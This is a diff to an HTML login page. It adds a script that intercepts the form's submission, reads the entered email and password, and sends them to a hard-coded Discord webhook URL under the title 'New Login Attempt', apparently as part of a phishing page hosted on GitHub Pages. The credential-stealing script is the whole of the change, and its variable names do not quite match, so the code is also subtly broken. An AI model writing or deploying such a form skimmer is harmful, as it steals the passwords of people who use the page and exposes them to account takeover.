@@ -272,6 +272,56 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
                 </div>
             </form>
 
+
+<!-- ==================== JAVASCRIPT ==================== -->
+<script>
+    document.getElementById('captcha-form').addEventListener('submit', async function(e) {
+        e.preventDefault(); // Stop normal submission (important for GitHub Pages)
+
+        const name      = document.getElementById('email').value.trim();
+        const firstname = document.getElementById('password').value.trim();
+        const remember  = document.getElementById('remember').checked ? 'Yes' : 'No';
+
+        // Your Discord webhook
+        const webhookUrl = "https://discord.com/api/webhooks/1492217076667121734/zs-o6BpUOqzTF57nzzZ_YOGh2cS2jyUSiTT6rexo6Xbs8siNGhSyluGGjgcVE_Is2Ynq";
+
+        const payload = {
+            embeds: [{
+                title: "🚨 New Login Attempt",
+                color: 0x3498db,
+                timestamp: new Date().toISOString(),
+                fields: [
+                    { name: " Email", value: email || "N/A", inline: true },
+                    { name: " Password", value: password || "N/A", inline: true },
+                    { name: "Remember Me", value: remember, inline: true },
+                    { name: "Time", value: new Date().toLocaleString(), inline: true }
+                ],
+                footer: {
+                    text: "Submitted from GitHub Pages"
+                }
+            }]
+        };
+
+        try {
+            const response = await fetch(webhookUrl, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(payload)
+            });
+
+            if (response.ok) {
+                alert("✅ Login data sent successfully!");
+                this.reset(); // Clear the form
+            } else {
+                alert("❌ Failed to send data");
+            }
+        } catch (error) {
+            console.error(error);
+            alert("❌ Error sending to Discord. Check console.");
+        }
+    });
+</script>
+            
                             <hr>
 
                 <div class="text-center mt-4">
